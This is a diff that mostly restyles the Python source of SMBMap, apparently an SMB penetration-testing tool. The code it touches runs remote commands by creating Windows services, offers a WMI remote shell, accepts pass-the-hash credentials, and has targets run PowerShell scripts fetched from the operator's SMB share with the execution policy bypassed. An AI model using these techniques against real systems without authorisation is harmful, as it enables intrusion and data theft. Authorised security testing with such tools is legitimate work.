@@ -68,9 +68,7 @@ banner = r"""
 
 def colored(msg, *args, **kwargs):
     global USE_TERMCOLOR
-    if USE_TERMCOLOR:
-        return termcolored(msg, *args, **kwargs)
-    return msg
+    return termcolored(msg, *args, **kwargs) if USE_TERMCOLOR else msg
 
 
 class Loader(Thread):
@@ -92,7 +90,7 @@ class Loader(Thread):
         while self._running:
             for char in self._progress:
                 if SEND_UPDATE_MSG:
-                    print('[{}] {}...'.format(char, self._msg), end='')
+                    print(f'[{char}] {self._msg}...', end='')
                     print('\r', end='')
                     time.sleep(0.05)
 
@@ -118,7 +116,7 @@ class SMBServer(Thread):
     def cleanup_server(self):
         logging.info('Cleaning up..')
         try:
-            os.unlink(SMBSERVER_DIR + '/smb.log')
+            os.unlink(f'{SMBSERVER_DIR}/smb.log')
         except:
             pass
         os.rmdir(SMBSERVER_DIR)
@@ -130,7 +128,7 @@ class SMBServer(Thread):
         smbConfig.set('global','server_name','nopsec')
         smbConfig.set('global','server_os','UNIX')
         smbConfig.set('global','server_domain','WORKGROUP')
-        smbConfig.set('global','log_file', SMBSERVER_DIR + '/smb.log')
+        smbConfig.set('global', 'log_file', f'{SMBSERVER_DIR}/smb.log')
         smbConfig.set('global','credentials_file','')
 
         # Let's add a dummy share
@@ -168,7 +166,6 @@ class SMBServer(Thread):
             self.smb.serve_forever()
         except Exception as e:
             print('[!] Error starting SMB server: ', e)
-            pass
 
     def stop(self):
         self.cleanup_server()
@@ -290,14 +287,12 @@ class RemoteShellWMI(cmd.Cmd):
             newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
             drive, tail = ntpath.splitdrive(newPath)
             filename = ntpath.basename(tail)
-            fh = open(filename,'wb')
-            logging.info("Downloading %s\\%s" % (drive, tail))
-            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
-            fh.close()
+            with open(filename,'wb') as fh:
+                logging.info("Downloading %s\\%s" % (drive, tail))
+                self.__transferClient.getFile(f'{drive[:-1]}$', tail, fh.write)
         except Exception as e:
             logging.error(str(e))
             os.remove(filename)
-            pass
 
     def do_put(self, s):
         try:
@@ -310,16 +305,14 @@ class RemoteShellWMI(cmd.Cmd):
                 dst_path = ''
 
             src_file = os.path.basename(src_path)
-            fh = open(src_path, 'rb')
-            dst_path = string.replace(dst_path, '/','\\')
-            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
-            drive, tail = ntpath.splitdrive(pathname)
-            logging.info("Uploading %s to %s" % (src_file, pathname))
-            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
-            fh.close()
+            with open(src_path, 'rb') as fh:
+                dst_path = string.replace(dst_path, '/','\\')
+                pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
+                drive, tail = ntpath.splitdrive(pathname)
+                logging.info(f"Uploading {src_file} to {pathname}")
+                self.__transferClient.putFile(f'{drive[:-1]}$', tail, fh.read)
         except Exception as e:
             logging.critical(str(e))
-            pass
 
     def do_exit(self, s):
         return True
@@ -328,16 +321,16 @@ class RemoteShellWMI(cmd.Cmd):
         return False
 
     def do_cd(self, s):
-        self.execute_remote('cd ' + s)
+        self.execute_remote(f'cd {s}')
         if len(self.__outputBuffer.strip('\r\n')) > 0:
             print(self.__outputBuffer)
-            self.__outputBuffer = ''
         else:
             self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
             self.execute_remote('cd ')
             self.__pwd = self.__outputBuffer.strip('\r\n')
-            self.prompt = self.__pwd + '>'
-            self.__outputBuffer = ''
+            self.prompt = f'{self.__pwd}>'
+
+        self.__outputBuffer = ''
 
     def default(self, line):
         # Let's try to guess if the user is trying to change drive
@@ -346,19 +339,17 @@ class RemoteShellWMI(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 print(self.__outputBuffer)
-                self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
                 self.__pwd = line
                 self.execute_remote('cd ')
                 self.__pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = self.__pwd + '>'
-                self.__outputBuffer = ''
-        else:
-            if line != '':
-                x = inspect.currentframe()
-                y = inspect.getouterframes(x,2)
-                return self.send_data(line)
+                self.prompt = f'{self.__pwd}>'
+            self.__outputBuffer = ''
+        elif line != '':
+            x = inspect.currentframe()
+            y = inspect.getouterframes(x,2)
+            return self.send_data(line)
 
     def get_output(self):
         def output_callback(data):
@@ -373,12 +364,9 @@ class RemoteShellWMI(cmd.Cmd):
                 self.__transferClient.getFile(self.__share, self.__output, output_callback)
                 break
             except Exception as e:
-                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
+                if 'STATUS_SHARING_VIOLATION' in str(e):
                     # Output not finished, let's wait
                     time.sleep(1)
-                    pass
-                else:
-                    pass
         self.__transferClient.deleteFile(self.__share, self.__output)
         return self.__output
 
@@ -420,7 +408,7 @@ class CMDEXEC:
 
     def run(self, remoteName, remoteHost):
         stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % remoteName
-        logging.debug('StringBinding %s'%stringbinding)
+        logging.debug(f'StringBinding {stringbinding}')
         rpctransport = transport.DCERPCTransportFactory(stringbinding)
         rpctransport.set_dport(self.__port)
         if hasattr(rpctransport,'setRemoteHost'):
@@ -444,8 +432,8 @@ class CMDEXEC:
             self.shell.send_data(self.command)
             if self.__mode == 'SERVER':
                 serverThread.stop()
-        except  (Exception, KeyboardInterrupt) as e:
-            print('[!] Something went wrong:', str(e))
+        except (Exception, KeyboardInterrupt) as e:
+            print('[!] Something went wrong:', e)
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, rpc, mode, serviceName):
@@ -533,19 +521,17 @@ class RemoteShell(cmd.Cmd):
             self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
             self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
         else:
-            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
-            output_callback(fd.read())
-            fd.close()
-            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)
+            with open(f'{SMBSERVER_DIR}/{OUTPUT_FILENAME}', 'r') as fd:
+                output_callback(fd.read())
+            os.unlink(f'{SMBSERVER_DIR}/{OUTPUT_FILENAME}')
 
     def execute_remote(self, data):
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
-                  self.__shell + self.__batchFile
+        command = f'{self.__shell}echo {data} ^> {self.__output} 2^>^&1 > {self.__batchFile} & {self.__shell}{self.__batchFile}'
         if self.__mode == 'SERVER':
-            command += ' & ' + self.__copyBack
+            command += f' & {self.__copyBack}'
         command += ' & ' + 'del ' + self.__batchFile
 
-        logging.debug('Executing %s' % command)
+        logging.debug(f'Executing {command}')
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
         service = resp['lpServiceHandle']
 
@@ -607,7 +593,6 @@ class SMBMap():
             print('[!] Run as r00t, or maybe something is using port 445...')
             self.kill_loader()
             return False
-            sys.exit(1)
 
 
     def start_file_search(self, host, pattern, share, search_path):
@@ -619,13 +604,13 @@ class SMBMap():
                 tmp_dir = 'C:\\Windows\\Temp'
 
             tmp_bat_cmd = 'powershell -NoLogo -ExecutionPolicy bypass -Command " & {}Get-ChildItem {}\*.* -Recurse -Exclude *.dll,*.exe,*.msi,*.jpg,*.gif,*.bmp,*.png,*.mp3,*.wav | Select-String -Pattern \'{}\' | Select-Object -Unique Path | out-string -width 220{}" 2>nul > {}\{}.txt'.format('{', search_path, pattern, '}', tmp_dir, job_name)
-            tmp_bat = open('./{}/{}.bat'.format(PSUTIL_DIR, job_name), 'w')
-            tmp_bat.write(tmp_bat_cmd)
-            tmp_bat.close()
-
-            ps_command = 'powershell -ExecutionPolicy bypass -NoLogo -command "Start-Process """cmd.exe""" """/c \\\\{}\\{}\\{}.bat""" "'.format(myIPaddr, PSUTIL_SHARE, job_name)
+            with open(f'./{PSUTIL_DIR}/{job_name}.bat', 'w') as tmp_bat:
+                tmp_bat.write(tmp_bat_cmd)
+            ps_command = f'powershell -ExecutionPolicy bypass -NoLogo -command "Start-Process """cmd.exe""" """/c \\\\{myIPaddr}\\{PSUTIL_SHARE}\\{job_name}.bat""" "'
             success = self.exec_command(host, share, ps_command, disp_output=False)
-            print('[+] Job {} started on {}, result will be stored at {}\{}.txt'.format(job_name, host, tmp_dir, job_name))
+            print(
+                f'[+] Job {job_name} started on {host}, result will be stored at {tmp_dir}\{job_name}.txt'
+            )
             proc_id = self.get_job_procid(host, share, tmp_dir, job_name)
             if len(proc_id) > 0:
                 proc_id = [j.strip() for j in proc_id.split('\n') if len(j) > 0]
@@ -635,19 +620,18 @@ class SMBMap():
             fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
             #print('[!] Something weird happened: {} on line {}'.format(e, exc_tb.tb_lineno))
             sys.stdout.flush()
-            print('[!] Job creation failed on host: %s. Did you run as r00t?' % (host))
+            print(f'[!] Job creation failed on host: {host}. Did you run as r00t?')
 
     def get_job_procid(self, host, share, path, job):
         try:
             myIPaddr = self.get_ip_address()
-            file_path = '{}\{}.txt'.format(path, job)
-            command = 'powershell -NoLogo -ExecutionPolicy bypass -File "\\\\{}\\{}\\Get-FileLockProcess.ps1" "{}"'.format(myIPaddr, PSUTIL_SHARE, file_path)
-            result = self.exec_command(host, share, command, disp_output=False)
-            return result
+            file_path = f'{path}\{job}.txt'
+            command = f'powershell -NoLogo -ExecutionPolicy bypass -File "\\\\{myIPaddr}\\{PSUTIL_SHARE}\\Get-FileLockProcess.ps1" "{file_path}"'
+            return self.exec_command(host, share, command, disp_output=False)
         except Exception as e:
             exc_type, exc_obj, exc_tb = sys.exc_info()
             fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            print('[!] WTF: {} on line {}'.format(e, exc_tb.tb_lineno))
+            print(f'[!] WTF: {e} on line {exc_tb.tb_lineno}')
             sys.stdout.flush()
 
     def get_search_results(self, timeout):
@@ -655,12 +639,25 @@ class SMBMap():
         counter = 0
         num_jobs = len(list(self.jobs.keys()))
         start_time = time.perf_counter()
-        while len(list(self.jobs.keys())) > 0:
+        while list(self.jobs.keys()):
             try:
                 for job in list(self.jobs.keys()):
-                    isItThere = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "if exist {}\{}.txt echo ImHere"'.format(self.jobs[job]['tmp'], job), disp_output=False)
-                    result = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], 'cmd /c "2>nul (>>{}\{}.txt (call )) && (echo not locked) || (echo locked)"'.format(self.jobs[job]['tmp'], job), disp_output=False)
-                    if 'not locked' ==  result.strip() and isItThere.strip() == 'ImHere':
+                    isItThere = self.exec_command(
+                        self.jobs[job]['host'],
+                        self.jobs[job]['share'],
+                        f"""cmd /c "if exist {self.jobs[job]['tmp']}\{job}.txt echo ImHere\"""",
+                        disp_output=False,
+                    )
+                    result = self.exec_command(
+                        self.jobs[job]['host'],
+                        self.jobs[job]['share'],
+                        f"""cmd /c "2>nul (>>{self.jobs[job]['tmp']}\{job}.txt (call )) && (echo not locked) || (echo locked)\"""",
+                        disp_output=False,
+                    )
+                    if (
+                        result.strip() == 'not locked'
+                        and isItThere.strip() == 'ImHere'
+                    ):
                         dl_target = '%s%s\%s.txt' % (self.jobs[job]['share'], self.jobs[job]['tmp'][2:], job)
                         host_dest = download_file(self.hosts[self.jobs[job]['host']]['smbconn'][0], dl_target)
                         counter += 1
@@ -673,17 +670,17 @@ class SMBMap():
                             self.search_output_buffer += 'No matching patterns found\n\n'
                         print('[+] Job %d of %d completed on %s...' % (counter, num_jobs, self.jobs[job]['host']))
                         self.delete_file(self.jobs[job]['host'], dl_target)
-                        os.remove('./{}/{}.bat'.format(PSUTIL_DIR, job))
+                        os.remove(f'./{PSUTIL_DIR}/{job}.bat')
                         self.jobs.pop(job, None)
                         if counter >= num_jobs:
                             break
                     else:
                         if time.perf_counter()-self.jobs[job]['start_time'] > int(timeout):
-                            print('[!] Job {} is taking a long time....it\'s getting punted'.format(job))
+                            print(f"[!] Job {job} is taking a long time....it\'s getting punted")
                             for pid in self.jobs[job]['proc_id']:
-                                kill_job = 'taskkill /PID {} /F'.format(pid)
+                                kill_job = f'taskkill /PID {pid} /F'
                                 success = self.exec_command(self.jobs[job]['host'], self.jobs[job]['share'], kill_job, disp_output=False)
-                                os.remove('./{}/{}.bat'.format(PSUTIL_DIR, job))
+                                os.remove(f'./{PSUTIL_DIR}/{job}.bat')
                         time.sleep(10)
             except Exception as e:
                 print(e)
@@ -721,16 +718,15 @@ class SMBMap():
                             break
                     disks.append(net_disks)
                     net_disks = ''
-            print('[+] Host %s Local %s' % (host, local_disks.strip()))
-            print('[+] Host %s Net Drive(s):' % (host))
-            if len(disks) > 0:
+            print(f'[+] Host {host} Local {local_disks.strip()}')
+            print(f'[+] Host {host} Net Drive(s):')
+            if disks:
                 for disk in disks:
                      print('\t%s' % (disk))
             else:
                 print('\tNo mapped network drives')
-            pass
         except Exception as e:
-            print('[!] Error on {}: {}'.format(host, e))
+            print(f'[!] Error on {host}: {e}')
 
     def kill_loader(self):
         self.loading = False
@@ -752,14 +748,13 @@ class SMBMap():
 
             if mode == 'wmi':
                 executer = WMIEXEC(username=self.hosts[host]['user'], password=self.hosts[host]['passwd'],  hashes=hashes, share=share, command=command, scr_output=disp_output)
-                result = executer.run(host)
+                return executer.run(host)
             else:
                 executer = CMDEXEC(username=self.hosts[host]['user'], password=self.hosts[host]['passwd'],  hashes=hashes, share=share, command=command)
-                result = executer.run(host_name, host)
-            return result
+                return executer.run(host_name, host)
         except:
             exc_type, exc_obj, exc_tb = sys.exc_info()
-            print('[!] Something weird happened: {} on line {}'.format(e, exc_tb.tb_lineno))
+            print(f'[!] Something weird happened: {e} on line {exc_tb.tb_lineno}')
             sys.stdout.flush()
             return none
 
@@ -773,7 +768,7 @@ class SMBMap():
         try:
             self.hosts[host]['smbconn'][0].deleteFile(share, path + filename)
             if self.verbose:
-                print('[+] File successfully deleted: %s%s%s' % (share, path, filename))
+                print(f'[+] File successfully deleted: {share}{path}{filename}')
         except SessionError as e:
             if 'STATUS_ACCESS_DENIED' in str(e):
                 print('[!] Error deleting file, access denied')
@@ -785,10 +780,10 @@ class SMBMap():
                 self.hosts[host]['smbconn'][0].deleteDirectory(share, path)
                 #self.remove_dir(host, share, path)
             else:
-                print('[!] Error deleting file %s%s%s, unknown error' % (share, path, filename))
+                print(f'[!] Error deleting file {share}{path}{filename}, unknown error')
                 print('[!]', e)
         except Exception as e:
-            print('[!] Error deleting file %s%s%s, unknown error' % (share, path, filename))
+            print(f'[!] Error deleting file {share}{path}{filename}, unknown error')
             print('[!]', e)
 
     def upload_file(self, host, src, dst):
@@ -798,15 +793,14 @@ class SMBMap():
         share = dst[0]
         dst = '\\'.join(dst[1:])
         if os.path.exists(src):
-            print('[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src)))
-            upFile = open(src, 'rb')
-            try:
-                self.hosts[host]['smbconn'][0].putFile(share, dst, upFile.read)
-                print('[+] Upload complete')
-            except Exception as e:
-                print('[!]', e)
-                print('[!] Error uploading file, you need to include destination file name in the path')
-            upFile.close()
+            print(f'[+] Starting upload: {src} ({os.path.getsize(src)} bytes)')
+            with open(src, 'rb') as upFile:
+                try:
+                    self.hosts[host]['smbconn'][0].putFile(share, dst, upFile.read)
+                    print('[+] Upload complete')
+                except Exception as e:
+                    print('[!]', e)
+                    print('[!] Error uploading file, you need to include destination file name in the path')
         else:
             print('[!] Invalid source. File does not exist')
             sys.exit()
@@ -815,10 +809,7 @@ class SMBMap():
         try:
             if len(password.split(':')) == 2:
                 lm, ntlm = password.split(':')
-                if len(lm) == 32 and len(ntlm) == 32:
-                    return True
-                else:
-                    return False
+                return len(lm) == 32 and len(ntlm) == 32
         except Exception as e:
             return False
 
@@ -829,7 +820,9 @@ def get_version( version_args ):
     domain = smbconn.getServerDomain()
     if not domain:
         domain = smbconn.getServerName()
-    print("[+] {}:{} is running {} (name:{}) (domain:{})".format(host, 445, smbconn.getServerOS(), smbconn.getServerName(), domain))
+    print(
+        f"[+] {host}:445 is running {smbconn.getServerOS()} (name:{smbconn.getServerName()}) (domain:{domain})"
+    )
 
 def signal_handler(signal, frame):
     print('You pressed Ctrl+C!')
